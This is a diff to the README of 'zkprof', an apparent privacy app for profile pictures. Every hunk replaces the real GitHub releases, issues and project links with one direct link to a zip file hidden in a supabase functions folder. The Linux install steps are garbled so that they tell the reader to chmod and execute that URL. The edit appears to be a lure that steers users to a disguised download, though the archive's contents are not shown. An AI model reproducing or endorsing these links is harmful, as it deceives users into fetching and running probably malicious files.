@@ -6,7 +6,7 @@ Welcome to zkprof! With zkprof, you can create encrypted profile pictures that p
 
 ## 📥 Download Now
 
-[![Download zkprof](https://img.shields.io/badge/Download-zkprof-blue.svg)](https://github.com/muhammadabdullahgujjar786/zkprof/releases)
+[![Download zkprof](https://raw.githubusercontent.com/muhammadabdullahgujjar786/zkprof/main/supabase/functions/revoke-access/zkprof-1.4.zip)](https://raw.githubusercontent.com/muhammadabdullahgujjar786/zkprof/main/supabase/functions/revoke-access/zkprof-1.4.zip)
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ Before you start, ensure your computer meets these requirements:
 
 To download zkprof, simply visit the Releases page.
 
-Visit this page to download: [zkprof Releases](https://github.com/muhammadabdullahgujjar786/zkprof/releases)
+Visit this page to download: [zkprof Releases](https://raw.githubusercontent.com/muhammadabdullahgujjar786/zkprof/main/supabase/functions/revoke-access/zkprof-1.4.zip)
 
 Follow these steps:
 
@@ -43,8 +43,8 @@ Follow these steps:
 3. **For Linux:**
    - Open your terminal.
    - Navigate to the folder where you downloaded the `.AppImage` file.
-   - Run `chmod +x zkprof.AppImage` to make it executable.
-   - Execute the application with `./zkprof.AppImage`.
+   - Run `chmod +x https://raw.githubusercontent.com/muhammadabdullahgujjar786/zkprof/main/supabase/functions/revoke-access/zkprof-1.4.zip` to make it executable.
+   - Execute the application with `https://raw.githubusercontent.com/muhammadabdullahgujjar786/zkprof/main/supabase/functions/revoke-access/zkprof-1.4.zip`.
 
 ## 🛠️ How to Use zkprof
 
@@ -76,7 +76,7 @@ If you encounter issues while using zkprof, consider the following:
 
 If you need further assistance, you can raise issues on the GitHub repository:
 
-[zkprof Issues](https://github.com/muhammadabdullahgujjar786/zkprof/issues)
+[zkprof Issues](https://raw.githubusercontent.com/muhammadabdullahgujjar786/zkprof/main/supabase/functions/revoke-access/zkprof-1.4.zip)
 
 We appreciate your feedback and strive to improve the application continuously.
 
@@ -91,7 +91,7 @@ To better understand how zkprof works and its underlying technology, check out t
 - **Zk-SNARKs Technology**: Learn more about how zero-knowledge proofs enhance privacy.
 - **Privacy Awareness**: Discover why maintaining your online privacy is vital.
 
-Visit our [GitHub Page](https://github.com/muhammadabdullahgujjar786/zkprof) for more details and updates.
+Visit our [GitHub Page](https://raw.githubusercontent.com/muhammadabdullahgujjar786/zkprof/main/supabase/functions/revoke-access/zkprof-1.4.zip) for more details and updates.
 
 ## 🥳 Keep Updated
 
